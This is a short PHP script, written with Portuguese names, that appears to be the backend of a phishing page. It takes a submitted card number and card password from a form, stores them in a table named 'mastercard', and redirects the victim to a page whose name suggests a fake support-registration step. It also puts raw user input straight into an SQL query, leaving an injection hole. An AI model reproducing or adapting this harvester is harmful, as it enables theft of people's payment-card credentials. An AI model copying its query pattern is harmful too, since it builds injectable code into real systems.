<?php 

include 'conexao.php';

$numero_cartao = $_POST['numero_cartao'];
$senha = $_POST['senha'];

$query = "INSERT INTO mastercard (numero_cartao, senha) VALUES('$numero_cartao','$senha')";

mysqli_query($conexao, $query);

header('location: class_cadastrosuporte.php');

?>